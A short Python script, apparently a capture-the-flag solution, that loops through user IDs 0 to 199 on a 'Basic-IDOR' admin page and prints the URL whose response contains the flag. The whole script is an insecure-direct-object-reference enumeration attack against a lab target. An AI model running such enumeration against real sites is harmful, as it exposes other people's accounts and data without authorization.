import requests

with requests.session() as s:
    for i in range(0, 200):
        response = s.get("http://tbsctf.fr/web/Basic-IDOR/admin.php?user=%s" % (str(i)))
        if "TBS{" in response.text:
            print(response.url)